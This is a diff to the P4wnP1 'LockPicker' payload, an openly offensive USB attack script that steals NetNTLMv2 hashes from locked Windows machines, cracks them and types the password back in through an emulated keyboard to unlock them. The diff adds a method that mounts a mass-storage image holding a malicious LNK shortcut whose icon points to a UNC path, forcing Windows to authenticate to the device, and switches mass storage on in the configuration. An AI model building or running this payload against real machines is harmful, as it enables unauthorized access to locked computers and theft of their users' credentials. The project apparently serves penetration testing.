@@ -20,6 +20,7 @@
 # P4wnP1 LockPicker demo payload by MaMe82
 # ==========================
 # Author: MaMe82
+# Updated by: Plazmaz
 #
 # Runs an extended version of "Snagging creds from locked machines"
 # which was presented by Rob 'MUBIX' Fuller
@@ -28,7 +29,10 @@
 # cracking and typed out via HID keyboard on success, to unlock the box.
 # This succeeds if the target has set a weak password.
 #
-# As the base issue should have been patched (MS16-112), capturing hashes shouldn't succeed in most cases
+# As the original issue should have been patched (MS16-112), capturing hashes may not succeed in all cases. However,
+# this payload also uses an alternative method for exfiltrating hashes that involves mounting a mass storage device
+# with a windows shortcut file. This file has an icon pointing to a UNC path, which makes windows send a request
+# and attempt to authenticate with P4wnP1.
 # 
 # The payload chooses a random USB PID, to raise the likelyhood of carrying out the
 # attack multiple times (Windows re-installs the drivers and thus assigns a new network. 
@@ -59,18 +63,20 @@
 # solid LED: 	payload finished execution 
 #
 # Remarks:
-#	This is a PoC payload which show several techniques:
-#		- combining network and keyboard attacks
-#		- force Windows to reinstall drivers (random USB PID)
+#	This is a PoC payload which highlights several techniques:
+#		- Combining network and keyboard attacks
+#		- Forcing Windows to reinstall drivers (random USB PID)
+#       - Forcing UNC requests with a malicious LNK icon file (generated using https://github.com/Plazmaz/LNKUp)
 #		- capturing traffic of the whole IPv4 range (combine static routing with 1 bit network mask
 #		  with iptables REDIRECT rules to catch the traffic destinated to foreign targets)
 #
 #   The payload is limited to ASCII based passwords (due to the nature of underlying keyboard iplementation
 #	which isn't able to handle UNICODE)
 #
-#	As stated, the issue responsible for emitting the NetNTLMv2 hashes from locked Windows machines should
-#	be patched. Anyway, there's a ton of software, spitting out the hashes (one is mentioned in P4wnP1 README.md).
-#	Having a browser running on the locked machine, raises chances to grab a hash (forced access to a rouge SMB\
+#	As stated, the original issue responsible for emitting the NetNTLMv2 hashes from locked Windows machines should
+#	be patched, however it is still likely they will leak via LNK files.
+#   Regardless, there's a ton of software, spitting out the hashes (one is mentioned in P4wnP1 README.md).
+#	Additionally, having a browser running on the locked machine, raises chances to grab a hash using the original method (forced access to a rouge SMB\
 #	server after redirecting the HTTP request to Responder.py)
 
 # =============================
@@ -78,13 +84,15 @@
 # =============================
 # Make sure to change USB_PID if you enable different USB functionality in order
 # to force Windows to enumerate the device again
+UMSLABEL="LNKUp"
+fatlabel $wdir/USB_STORAGE/lnk_exfil.bin $UMSLABEL
 USB_VID="0x1d6b"        # Vendor ID
 USB_PID=$(printf "0x%04X" $RANDOM)        # Random PID to raise chance of driver reinstall
 
 USE_ECM=false            # we need no Linux/Mac networking
 USE_RNDIS=true          # RNDIS network device to enable hash stealing
 USE_HID=true            # HID keyboard to allow entering cracked password
-USE_UMS=false           # no mass storage
+USE_UMS=true           # Mass storage may lead to faster or more reliable hashes
 
 lang="us" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
 
